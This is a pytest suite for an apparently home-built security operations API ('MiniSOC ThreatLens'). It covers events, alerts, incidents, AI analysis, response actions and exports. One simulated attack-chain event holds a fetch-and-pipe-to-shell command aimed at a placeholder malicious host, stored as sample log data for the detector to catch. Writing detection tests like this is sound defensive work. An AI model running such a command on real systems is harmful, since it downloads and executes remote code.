import pytest
import json
import time
import asyncio
from fastapi.testclient import TestClient
from app.main import app
from app.config import settings
from app.models.database import Base
from app.db.session import engine, SessionLocal
from datetime import datetime, timedelta
import uuid

# ============================================
# SETUP & CONFIGURATION
# ============================================

client = TestClient(app)
API_KEY = settings.api_key or "your-static-api-key-here"
BASE_URL = "/api/v1"

# Helper function to create test events
def create_test_event(event_type="ssh_failed_login", count=1, source_ip="192.168.1.100"):
    """Create test events for testing."""
    events = []
    for i in range(count):
        event = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "host": "test-host",
            "source_ip": source_ip,
            "event_type": event_type,
            "username": "testuser",
            "severity": "low",
            "raw_event": f"Test event {i+1}"
        }
        events.append(event)
    return events[0] if count == 1 else events

# Helper to create an incident for testing
def create_test_incident():
    """Create a test incident by sending 5 failed logins."""
    for _ in range(5):
        event = create_test_event("ssh_failed_login", source_ip="10.10.10.20")
        response = client.post(
            f"{BASE_URL}/events",
            json=event,
            headers={"X-API-Key": API_KEY}
        )
        if response.status_code != 200:
            return None

    # Get the incident
    response = client.get(f"{BASE_URL}/incidents?limit=1")
    if response.status_code == 200 and len(response.json()) > 0:
        return response.json()[0]["id"]
    return None

# ============================================
# TEST: ROOT & HEALTH
# ============================================

class TestRootEndpoints:
    """Test root and health endpoints."""

    def test_root(self):
        """Test root endpoint."""
        response = client.get("/")
        assert response.status_code == 200
        data = response.json()
        assert "service" in data
        assert data["service"] == "MiniSOC ThreatLens"
        assert "endpoints" in data
        assert len(data["endpoints"]) > 0

    def test_health(self):
        """Test health endpoint."""
        response = client.get("/health")
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "healthy"

# ============================================
# TEST: EVENTS API
# ============================================

class TestEventsAPI:
    """Test events endpoints."""

    def test_post_event(self):
        """Test event submission."""
        event = create_test_event("ssh_failed_login", source_ip="10.10.10.20")
        response = client.post(
            f"{BASE_URL}/events",
            json=event,
            headers={"X-API-Key": API_KEY}
        )
        assert response.status_code == 200, f"Failed: {response.text}"
        data = response.json()
        assert data["status"] == "success"
        assert "event_id" in data
        assert "alerts_created" in data

    def test_post_event_invalid_api_key(self):
        """Test event submission with invalid API key."""
        event = create_test_event()
        response = client.post(
            f"{BASE_URL}/events",
            json=event,
            headers={"X-API-Key": "invalid-key"}
        )
        assert response.status_code == 401

    def test_post_event_invalid_data(self):
        """Test event submission with invalid data."""
        response = client.post(
            f"{BASE_URL}/events",
            json={
                "host": "ubuntu-server",  # Missing required timestamp
                "source_ip": "10.10.10.20",
                "event_type": "ssh_failed_login"
            },
            headers={"X-API-Key": API_KEY}
        )
        assert response.status_code == 422  # Validation error

    def test_list_events(self):
        """Test listing events."""
        response = client.get(f"{BASE_URL}/events?limit=10")
        assert response.status_code == 200
        data = response.json()
        assert isinstance(data, list)
        if len(data) > 0:
            assert "id" in data[0]
            assert "event_type" in data[0]
            assert "host" in data[0]

    def test_list_events_with_limit(self):
        """Test listing events with limit."""
        # Send 5 test events
        for _ in range(5):
            event = create_test_event()
            response = client.post(
                f"{BASE_URL}/events",
                json=event,
                headers={"X-API-Key": API_KEY}
            )
            assert response.status_code == 200

        response = client.get(f"{BASE_URL}/events?limit=3")
        assert response.status_code == 200
        data = response.json()
        assert len(data) <= 3

# ============================================
# TEST: ALERTS API
# ============================================

class TestAlertsAPI:
    """Test alerts endpoints."""

    def test_list_alerts(self):
        """Test listing alerts."""
        response = client.get(f"{BASE_URL}/alerts")
        assert response.status_code == 200
        data = response.json()
        assert isinstance(data, list)
        if len(data) > 0:
            assert "id" in data[0]
            assert "alert_type" in data[0]
            assert "severity" in data[0]

    def test_list_alerts_with_filter(self):
        """Test filtering alerts by status."""
        response = client.get(f"{BASE_URL}/alerts?status=open")
        assert response.status_code == 200
        data = response.json()
        assert isinstance(data, list)
        for alert in data:
            assert alert["status"] == "open" or alert.get("status") is None

    def test_get_alert(self):
        """Test getting a specific alert."""
        # First, get list of alerts
        list_response = client.get(f"{BASE_URL}/alerts?limit=1")
        if len(list_response.json()) > 0:
            alert_id = list_response.json()[0]["id"]
            response = client.get(f"{BASE_URL}/alerts/{alert_id}")
            assert response.status_code == 200
            data = response.json()
            assert data["id"] == alert_id

    def test_get_alert_not_found(self):
        """Test getting a non-existent alert."""
        response = client.get(f"{BASE_URL}/alerts/non-existent-id")
        assert response.status_code == 404

# ============================================
# TEST: INCIDENTS API
# ============================================

class TestIncidentsAPI:
    """Test incidents endpoints."""

    def test_list_incidents(self):
        """Test listing incidents."""
        response = client.get(f"{BASE_URL}/incidents")
        assert response.status_code == 200
        data = response.json()
        assert isinstance(data, list)
        if len(data) > 0:
            assert "id" in data[0]
            assert "title" in data[0]
            assert "severity" in data[0]
            assert "status" in data[0]

    def test_list_incidents_with_filter(self):
        """Test filtering incidents by status."""
        response = client.get(f"{BASE_URL}/incidents?status=open")
        assert response.status_code == 200
        data = response.json()
        assert isinstance(data, list)
        for incident in data:
            assert incident["status"] == "open"

    def test_list_incidents_with_limit(self):
        """Test listing incidents with limit."""
        response = client.get(f"{BASE_URL}/incidents?limit=5")
        assert response.status_code == 200
        data = response.json()
        assert len(data) <= 5

    def test_get_incident(self):
        """Test getting a specific incident."""
        # First, get list of incidents
        list_response = client.get(f"{BASE_URL}/incidents?limit=1")
        if len(list_response.json()) > 0:
            incident_id = list_response.json()[0]["id"]
            response = client.get(f"{BASE_URL}/incidents/{incident_id}")
            assert response.status_code == 200
            data = response.json()
            assert "incident" in data
            assert data["incident"]["id"] == incident_id
            assert "alerts" in data
            assert "alert_count" in data

    def test_get_incident_not_found(self):
        """Test getting a non-existent incident."""
        response = client.get(f"{BASE_URL}/incidents/non-existent-id")
        assert response.status_code == 404

    def test_update_incident(self):
        """Test updating an incident."""
        # Create an incident
        incident_id = create_test_incident()
        if not incident_id:
            pytest.skip("Could not create incident for testing")

        # Update the incident
        response = client.patch(
            f"{BASE_URL}/incidents/{incident_id}",
            json={
                "status": "investigating",
                "severity": "high"
            }
        )
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "success"
        assert data["incident"]["status"] == "investigating"

    def test_search_incidents(self):
        """Test searching incidents."""
        response = client.get(f"{BASE_URL}/incidents/search?q=ssh")
        assert response.status_code == 200
        data = response.json()
        assert isinstance(data, list)

    def test_search_incidents_with_filter(self):
        """Test searching incidents with filters."""
        response = client.get(
            f"{BASE_URL}/incidents/search?severity=high&status=open"
        )
        assert response.status_code == 200
        data = response.json()
        assert isinstance(data, list)
        for incident in data:
            assert incident["severity"] == "high"
            assert incident["status"] == "open"

# ============================================
# TEST: AI ANALYSIS
# ============================================

class TestAIAnalysis:
    """Test AI analysis endpoints."""

    def test_analyze_incident(self):
        """Test AI analysis of an incident."""
        # Create a test incident
        incident_id = create_test_incident()
        if not incident_id:
            pytest.skip("Could not create incident for testing")

        # Test AI analysis
        response = client.post(f"{BASE_URL}/incidents/{incident_id}/analyze")
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "success"
        assert data["incident_id"] == incident_id

        # Check analysis structure
        analysis = data.get("analysis")
        if analysis:  # May be None if AI not available
            assert "summary" in analysis
            assert "attack_explanation" in analysis
            assert "evidence_list" in analysis
            assert isinstance(analysis["evidence_list"], list)
            assert "investigation_steps" in analysis
            assert isinstance(analysis["investigation_steps"], list)
            assert "containment_steps" in analysis
            assert isinstance(analysis["containment_steps"], list)

    def test_analyze_incident_not_found(self):
        """Test analyzing a non-existent incident."""
        response = client.post(f"{BASE_URL}/incidents/non-existent-id/analyze")
        assert response.status_code == 404

    def test_ai_analysis_stores_summary(self):
        """Test that AI analysis stores summary in incident."""
        incident_id = create_test_incident()
        if not incident_id:
            pytest.skip("Could not create incident for testing")

        # Run AI analysis
        response = client.post(f"{BASE_URL}/incidents/{incident_id}/analyze")
        assert response.status_code == 200

        # Get the incident to check if summary was stored
        response = client.get(f"{BASE_URL}/incidents/{incident_id}")
        assert response.status_code == 200
        data = response.json()
        incident = data.get("incident")

        if incident and incident.get("ai_summary"):
            assert isinstance(incident["ai_summary"], str)
            assert len(incident["ai_summary"]) > 0

# ============================================
# TEST: RESPONSE ACTIONS
# ============================================

class TestResponseActions:
    """Test response action endpoints."""

    def test_record_response_action(self):
        """Test recording a response action."""
        # Create a test incident
        incident_id = create_test_incident()
        if not incident_id:
            pytest.skip("Could not create incident for testing")

        # Test block IP action
        response = client.post(
            f"{BASE_URL}/incidents/{incident_id}/response",
            json={
                "action": "block_ip",
                "details": {"ip": "10.10.10.20"}
            }
        )
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "success"
        assert "response_id" in data
        assert data["incident_status"] == "contained"

    def test_record_multiple_actions(self):
        """Test recording multiple response actions."""
        # Get an existing incident
        response = client.get(f"{BASE_URL}/incidents?limit=1")
        if len(response.json()) > 0:
            incident_id = response.json()[0]["id"]

            # Test isolate host action
            response = client.post(
                f"{BASE_URL}/incidents/{incident_id}/response",
                json={
                    "action": "isolate_host",
                    "details": {"host": "ubuntu-server"}
                }
            )
            assert response.status_code == 200
            data = response.json()
            assert data["status"] == "success"
        else:
            pytest.skip("No incident found for testing")

    def test_response_action_not_found(self):
        """Test response action on non-existent incident."""
        response = client.post(
            f"{BASE_URL}/incidents/non-existent-id/response",
            json={"action": "block_ip", "details": {"ip": "1.1.1.1"}}
        )
        assert response.status_code == 404

# ============================================
# TEST: EXPORT FUNCTIONALITY
# ============================================

class TestExport:
    """Test export endpoints."""

    def test_export_incident_csv(self):
        """Test exporting incident as CSV."""
        list_response = client.get(f"{BASE_URL}/incidents?limit=1")
        if len(list_response.json()) > 0:
            incident_id = list_response.json()[0]["id"]
            response = client.get(f"{BASE_URL}/incidents/{incident_id}/export/csv")
            assert response.status_code == 200
            assert "text/csv" in response.headers["content-type"]
            assert "attachment" in response.headers["content-disposition"]
        else:
            pytest.skip("No incident found for testing")

    def test_export_incident_json(self):
        """Test exporting incident as JSON."""
        list_response = client.get(f"{BASE_URL}/incidents?limit=1")
        if len(list_response.json()) > 0:
            incident_id = list_response.json()[0]["id"]
            response = client.get(f"{BASE_URL}/incidents/{incident_id}/export/json")
            assert response.status_code == 200
            data = response.json()
            assert "incident" in data
            assert "alerts" in data
            assert "exported_at" in data
        else:
            pytest.skip("No incident found for testing")

    def test_export_all_incidents(self):
        """Test exporting all incidents."""
        response = client.get(f"{BASE_URL}/incidents/export/all?limit=5")
        assert response.status_code == 200
        data = response.json()
        assert "incidents" in data
        assert "total" in data
        assert "exported_at" in data

    def test_export_all_incidents_csv(self):
        """Test exporting all incidents as CSV."""
        response = client.get(f"{BASE_URL}/incidents/export/all?format=csv&limit=5")
        assert response.status_code == 200
        assert "text/csv" in response.headers["content-type"]

# ============================================
# TEST: DETECTION ENGINE (Full Attack Chain)
# ============================================

class TestDetectionEngine:
    """Test the full detection engine with an attack chain."""

    def test_full_attack_chain(self):
        """Test complete attack chain: recon → brute force → access → execution."""
        source_ip = "10.10.10.50"

        # Step 1: Port Scanning (recon)
        for _ in range(3):
            event = create_test_event("ssh_failed_login", source_ip=source_ip)
            event["raw_event"] = "Port scan detected"
            response = client.post(
                f"{BASE_URL}/events",
                json=event,
                headers={"X-API-Key": API_KEY}
            )
            assert response.status_code == 200

        # Step 2: Brute Force (5 failed logins)
        for _ in range(5):
            event = create_test_event("ssh_failed_login", source_ip=source_ip)
            event["raw_event"] = "Failed password for admin"
            response = client.post(
                f"{BASE_URL}/events",
                json=event,
                headers={"X-API-Key": API_KEY}
            )
            assert response.status_code == 200

        # Step 3: Successful Login
        success_event = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "host": "target-server",
            "source_ip": source_ip,
            "event_type": "ssh_success",
            "username": "admin",
            "severity": "medium",
            "raw_event": "Accepted password for admin"
        }
        response = client.post(
            f"{BASE_URL}/events",
            json=success_event,
            headers={"X-API-Key": API_KEY}
        )
        assert response.status_code == 200

        # Step 4: Suspicious Command
        cmd_event = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "host": "target-server",
            "source_ip": source_ip,
            "event_type": "command_execution",
            "username": "admin",
            "severity": "critical",
            "raw_event": "wget http://malicious.com/payload.sh | sh"
        }
        response = client.post(
            f"{BASE_URL}/events",
            json=cmd_event,
            headers={"X-API-Key": API_KEY}
        )
        assert response.status_code == 200

        # Check if incidents were created
        response = client.get(f"{BASE_URL}/incidents")
        assert response.status_code == 200
        incidents = response.json()
        assert len(incidents) > 0

        # Check if alerts were created
        response = client.get(f"{BASE_URL}/alerts")
        assert response.status_code == 200
        alerts = response.json()
        assert len(alerts) > 0

        # Verify MITRE techniques were mapped
        found_mitre = False
        for alert in alerts:
            if alert.get("mitre_technique"):
                found_mitre = True
                break
        assert found_mitre, "No MITRE techniques found in alerts"

# ============================================
# TEST: PERFORMANCE & RATE LIMITING
# ============================================

class TestPerformance:
    """Test performance and rate limiting."""

    def test_rate_limiting(self):
        """Test that rate limiting is working."""
        # Send many requests quickly
        for i in range(10):
            event = create_test_event("ssh_failed_login")
            response = client.post(
                f"{BASE_URL}/events",
                json=event,
                headers={"X-API-Key": API_KEY}
            )
            # Should handle 10 requests without rate limiting
            assert response.status_code in [200, 429]

    def test_bulk_event_submission(self):
        """Test bulk event submission."""
        for i in range(20):
            event = create_test_event("ssh_failed_login")
            response = client.post(
                f"{BASE_URL}/events",
                json=event,
                headers={"X-API-Key": API_KEY}
            )
            assert response.status_code == 200

        # Check that events were created
        response = client.get(f"{BASE_URL}/events?limit=20")
        assert response.status_code == 200
        data = response.json()
        assert len(data) >= 1

# ============================================
# TEST: WEBSOCKET
# ============================================

class TestWebSocket:
    """Test WebSocket endpoint."""

    def test_websocket_connection(self):
        """Test WebSocket connection."""
        try:
            import websockets
            import asyncio

            async def test_ws():
                uri = "ws://localhost:8000/api/v1/ws/events"
                async with websockets.connect(uri) as websocket:
                    response = await websocket.recv()
                    data = json.loads(response)
                    assert data["type"] == "connected"
                    assert data["status"] == "ok"
                    return True

            # Run the async test
            result = asyncio.run(test_ws())
            assert result is True

        except ImportError:
            pytest.skip("websockets library not installed")
        except Exception as e:
            pytest.skip(f"WebSocket connection failed: {e}")

# ============================================
# RUN ALL TESTS
# ============================================

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])